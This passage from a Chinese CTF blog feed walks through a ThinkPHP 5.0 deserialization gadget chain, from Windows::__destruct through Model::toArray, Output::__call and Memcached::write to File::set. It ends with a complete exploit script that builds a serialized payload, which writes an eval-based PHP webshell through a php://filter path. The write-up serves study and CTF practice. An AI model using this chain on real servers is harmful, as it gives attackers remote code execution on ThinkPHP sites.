<span class="comment"># 如果$this-&gt;append不为空</span></span><br><span class="line">           <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123; <span class="comment"># 遍历</span></span><br><span class="line">               <span class="keyword">if</span> (is_array(<span class="variable">$name</span>)) &#123; <span class="comment"># 如果是数组</span></span><br><span class="line">                   <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                   <span class="variable">$relation</span>   = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">                   <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;append(<span class="variable">$name</span>)-&gt;toArray();</span><br><span class="line">               &#125; <span class="keyword">elseif</span> (strpos(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                   <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                   <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                   <span class="variable">$relation</span>   = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">                   <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;append([<span class="variable">$attr</span>])-&gt;toArray();</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="variable">$relation</span> = Loader::parseName(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>); <span class="comment"># 直接返回$name</span></span><br><span class="line">                   <span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>, <span class="variable">$relation</span>)) &#123;</span><br><span class="line">                       <span class="variable">$modelRelation</span> = <span class="keyword">$this</span>-&gt;<span class="variable">$relation</span>(); <span class="comment"># 执行$name函数 返回一个类 $this-&gt;error</span></span><br><span class="line">                       <span class="variable">$value</span>         = <span class="keyword">$this</span>-&gt;getRelationData(<span class="variable">$modelRelation</span>); <span class="comment"># 返回$this-&gt;parent </span></span><br><span class="line">                       <span class="comment"># Output</span></span><br><span class="line"></span><br><span class="line">                       <span class="keyword">if</span> (method_exists(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getBindAttr&#x27;</span>)) &#123; <span class="comment"># 类里面要存在getBindAttr方法</span></span><br><span class="line">                           <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;getBindAttr(); <span class="comment"># 执行 返回一个数组</span></span><br><span class="line">                           <span class="keyword">if</span> (<span class="variable">$bindAttr</span>) &#123; <span class="comment">#$this-&gt;bindAttr = [&#x27;aaa&#x27;]</span></span><br><span class="line">                               <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$attr</span>) &#123; <span class="comment"># 遍历</span></span><br><span class="line">                                   <span class="variable">$key</span> = is_numeric(<span class="variable">$key</span>) ? <span class="variable">$attr</span> : <span class="variable">$key</span>; <span class="comment"># 判断</span></span><br><span class="line">                                   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[<span class="variable">$key</span>])) &#123; </span><br><span class="line">                                       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bind attr has exists:&#x27;</span> . <span class="variable">$key</span>);</span><br><span class="line">                                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                       <span class="comment"># 不要存在</span></span><br><span class="line">                                       <span class="comment"># $value有值然后直接执行方法 getAttr方法并没有什么特点，但是可以在这里利用</span></span><br><span class="line">                                       <span class="comment"># 然后调用__call方法(Output)</span></span><br><span class="line">                                       <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;getAttr(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br><span class="line">                                   &#125;</span><br><span class="line">                               &#125;</span><br><span class="line">                               <span class="keyword">continue</span>;</span><br><span class="line">                           &#125;</span><br><span class="line">                       &#125;</span><br><span class="line">                       <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                       <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$name</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$item</span>) ? <span class="variable">$item</span> : [];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelationData</span>(<span class="params">Relation <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;parent &amp;&amp; !<span class="variable">$modelRelation</span>-&gt;isSelfRelation() &amp;&amp; get_class(<span class="variable">$modelRelation</span>-&gt;getModel()) == get_class(<span class="keyword">$this</span>-&gt;parent)) &#123;</span><br><span class="line">           <span class="comment"># 要求$this-&gt;parent为true，且为非自关联 要求(Query)$this-&gt;model=(Model)$this-&gt;parent 然后直接返回$this-&gt;parent</span></span><br><span class="line">           <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;parent;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="comment">// 首先获取关联数据</span></span><br><span class="line">           <span class="keyword">if</span> (method_exists(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getRelation&#x27;</span>)) &#123;</span><br><span class="line">               <span class="variable">$value</span> = <span class="variable">$modelRelation</span>-&gt;getRelation();</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">BadMethodCallException</span>(<span class="string">&#x27;method not exists:&#x27;</span> . get_class(<span class="variable">$modelRelation</span>) . <span class="string">&#x27;-&gt; getRelation&#x27;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>3.<code>__call</code></p>
<p>在<code>OutPut</code>类找到可能可以利用的，其他的都较难利用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment"># method=getAttr args=$attr</span></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$method</span>, <span class="keyword">$this</span>-&gt;styles)) &#123;<span class="comment"># $this-&gt;styles = [&#x27;getAttr&#x27;]</span></span><br><span class="line">            array_unshift(<span class="variable">$args</span>, <span class="variable">$method</span>); <span class="comment"># 在数组$args前面插入$method</span></span><br><span class="line">            <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>, <span class="string">&#x27;block&#x27;</span>], <span class="variable">$args</span>); <span class="comment"># 这个类里的block方法</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;handle &amp;&amp; method_exists(<span class="keyword">$this</span>-&gt;handle, <span class="variable">$method</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>-&gt;handle, <span class="variable">$method</span>], <span class="variable">$args</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;method not exists:&#x27;</span> . <span class="keyword">__CLASS__</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$method</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以对<code>block</code>方法进行追踪，这里要知道<code>$method=getAttr $args=$key</code>（前面调用的 所以第二个if语句是不可利用的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">block</span>(<span class="params"><span class="variable">$style</span>, <span class="variable">$message</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment"># style=getAttr $message=$attr</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeln(<span class="string">&quot;&lt;<span class="subst">&#123;$style&#125;</span>&gt;<span class="subst">&#123;$message&#125;</span>&lt;/<span class="subst">$style</span>&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeln</span>(<span class="params"><span class="variable">$messages</span>, <span class="variable">$type</span> = <span class="built_in">self</span>::OUTPUT_NORMAL</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="variable">$messages</span>, <span class="literal">true</span>, <span class="variable">$type</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$messages</span>, <span class="variable">$newline</span> = <span class="literal">false</span>, <span class="variable">$type</span> = <span class="built_in">self</span>::OUTPUT_NORMAL</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;write(<span class="variable">$messages</span>, <span class="variable">$newline</span>, <span class="variable">$type</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接在这里搜索write的定义的时候会转到Console类里面的，但是追踪之后会发现没有任何可以利用的点，而这里的$this-&gt;handle是我们可随意改变的，所以我们可以直接全局搜索是否有可利用的write方法</span></span><br></pre></td></tr></table></figure>

<p>可以在<code>Memcache</code>中找到至少是我们可以利用的<code>write</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$sessID</span>, <span class="variable">$sessData</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment"># $sessID=$attr $sessData=false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;handler-&gt;set(<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;session_name&#x27;</span>] . <span class="variable">$sessID</span>, <span class="variable">$sessData</span>, <span class="number">0</span>, <span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;expire&#x27;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>直接搜索可利用的set方法，找了一圈下来发现set犯法都是三个参数，但是php是不在乎参数多少的</p>
<p><img src="https://img-blog.csdnimg.cn/9968013731d148989a715b159656e7b9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>在<code>File</code>类中找到似乎可以利用的<code>file_put_contents</code>，而data拼接里面存在exit，这种类型的以前是遇到过的，直接在filename那里用php伪协议绕过就好了，而同时要把我们要写入的一句话进行base64加密，同时不能让数据被压缩，所以<code>$this-&gt;options[&#39;data_compress&#39;]</code>要为false，然后只要文件写入成功了就好了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment"># $name=$attr $value=false $expire=0</span></span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="variable">$expire</span>)) &#123; <span class="comment"># $expire=0</span></span><br><span class="line">            <span class="variable">$expire</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$expire</span> <span class="keyword">instanceof</span> \DateTime) &#123;</span><br><span class="line">            <span class="variable">$expire</span> = <span class="variable">$expire</span>-&gt;getTimestamp() - time();</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="comment"># $name可控 getCacheKey对$name进行md5加密，然后加上php后缀并创建文件目录</span></span><br><span class="line">        <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;getCacheKey(<span class="variable">$name</span>, <span class="literal">true</span>); </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag &amp;&amp; !is_file(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="variable">$first</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = serialize(<span class="variable">$value</span>); <span class="comment"># 第一遍中的value不可控 由第二次为 PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            <span class="variable">$data</span> = gzcompress(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable">$result</span> = file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>); <span class="comment"># 可以利用php伪协议绕过exit</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">isset</span>(<span class="variable">$first</span>) &amp;&amp; <span class="keyword">$this</span>-&gt;setTagItem(<span class="variable">$filename</span>);</span><br><span class="line">            clearstatcache();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$auto</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = md5(<span class="variable">$name</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;cache_subdir&#x27;</span>]) &#123;</span><br><span class="line">            <span class="comment">// 使用子目录</span></span><br><span class="line">            <span class="variable">$name</span> = substr(<span class="variable">$name</span>, <span class="number">0</span>, <span class="number">2</span>) . DS . substr(<span class="variable">$name</span>, <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>]) &#123;</span><br><span class="line">            <span class="variable">$name</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . DS . <span class="variable">$name</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;path&#x27;</span>] . <span class="variable">$name</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$dir</span>      = dirname(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$auto</span> &amp;&amp; !is_dir(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">            mkdir(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">setTagItem</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag) &#123;<span class="comment"># $this-&gt;tag可控</span></span><br><span class="line">            <span class="variable">$key</span>       = <span class="string">&#x27;tag_&#x27;</span> . md5(<span class="keyword">$this</span>-&gt;tag);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tag = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;has(<span class="variable">$key</span>)) &#123;</span><br><span class="line">                <span class="variable">$value</span>   = explode(<span class="string">&#x27;,&#x27;</span>, <span class="keyword">$this</span>-&gt;get(<span class="variable">$key</span>));</span><br><span class="line">                <span class="variable">$value</span>[] = <span class="variable">$name</span>;</span><br><span class="line">                <span class="variable">$value</span>   = implode(<span class="string">&#x27;,&#x27;</span>, array_unique(<span class="variable">$value</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$value</span> = <span class="variable">$name</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;set(<span class="variable">$key</span>, <span class="variable">$value</span>, <span class="number">0</span>); <span class="comment"># 第二次进入get $value=$name 可控 所以要把要写入的内容也直接写进$path中</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>思路整理：</p>
<blockquote>
<p>1.首先从Windows类的__destruct方法开始，调用removeFiles方法，当对$this-&gt;files进行file_exits进行判断的时候触发toString方法</p>
<p>2.在Model类中找到toString方法，依旧是json调用toArray ，在这里可以实现对__call方法的调用，要求this-&gt;append数组不为空，并且数组里面的值不能是数组的类型，也不能存在<code>.</code>，在执行值所代表的方法的时候会返回一个类且这个类里面存在getBindAttr这个方法，而后面还有value=new Output()，所以 append[]=’getError’ this-&gt;error= OneToOne和Query的子类; this-&gt;parent=new Output();(Query)this-&gt;model = new Output(); </p>
<p>这里出现了一个矛盾，我们要求modelRelation 可以调用 getBindAttr，那modelRelation 最好是OneToOne，但是在getRelationData方法中我们要利用modelRelation 去调用model方法，而此时要用Query类，那么只能找OneToOne和Query的子类的</p>
<p>3.Output里面的__call方法，要求this-&gt;styles = [‘getAttr’]; this-&gt;handle=new Memcache();</p>
<p>4.Memcache类中的write方法，this-&gt;handle=new File();从而调用File类里面的set方法，this-&gt;options[‘cache_subdir’]=false；this-&gt;options[‘prefix’]=false;$this-&gt;options[‘path’]=(php伪协议);this-&gt;options[‘data_compress’]=false;</p>
</blockquote>
<p>网上找的exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Windows</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$files</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files = [<span class="variable">$files</span>]; <span class="comment">//$file =&gt; /think/Model的子类new Pivot(); Model是抽象类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = <span class="variable">$output</span>;  <span class="comment">//$this-&gt;parent=&gt; think\console\Output;</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;append = <span class="keyword">array</span>(<span class="string">&quot;xxx&quot;</span>=&gt;<span class="string">&quot;getError&quot;</span>);     <span class="comment">//调用getError 返回this-&gt;error</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;error = <span class="variable">$modelRelation</span>;               <span class="comment">// $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&gt;&gt;HasOne</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::__construct(<span class="variable">$output</span>, <span class="variable">$modelRelation</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">HasOne</span> <span class="title">extends</span> <span class="title">OneToOne</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">OneToOne</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$query</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;selfRelation = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;query = <span class="variable">$query</span>;    <span class="comment">//$query指向Query</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindAttr = [<span class="string">&#x27;xxx&#x27;</span>];<span class="comment">// $value值，作为call函数引用的第二变量</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Query</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$model</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;model = <span class="variable">$model</span>; <span class="comment">//$this-&gt;model=&gt; think\console\Output;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Output</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">handle</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle =<span class="variable">$handle</span>; <span class="comment">//$handle-&gt;think\session\driver\Memcached</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Memcached</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="variable">$handle</span>; <span class="comment">//$handle-&gt;think\cache\driver\File</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">File</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">options</span>=<span class="title">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options=[</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">3600</span>, </span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>, </span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>  =&gt; <span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php&#x27;</span>, <span class="comment">// $_POST[&#x27;ccc&#x27;]</span></span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tag = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">Memcached</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>(<span class="title">new</span> \<span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>());</span><br><span class="line">    <span class="variable">$Output</span> = <span class="keyword">new</span> think\console\Output(<span class="variable">$Memcached</span>);</span><br><span class="line">    <span class="variable">$model</span> = <span class="keyword">new</span> think\db\Query(<span class="variable">$Output</span>);</span><br><span class="line">    <span class="variable">$HasOne</span> = <span class="keyword">new</span> think\model\relation\HasOne(<span class="variable">$model</span>);</span><br><span class="line">    <span class="variable">$window</span> = <span class="keyword">new</span> think\process\pipes\Windows(<span class="keyword">new</span> think\model\Pivot(<span class="variable">$Output</span>,<span class="variable">$HasOne</span>));</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$window</span>);</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$window</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>没有人比我更爱学习</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buu刷题</tag>
        <tag>因为不知道该干什么所以代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>集训第一周学习</title>
    <url>/2022/01/19/%E9%9B%86%E8%AE%AD%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="SUCTF-annonymous"><a href="#SUCTF-annonymous" class="headerlink" title="[SUCTF]annonymous"></a>[SUCTF]annonymous</h4><ul>
<li>create_function</li>
</ul>
<p>源码：</p>
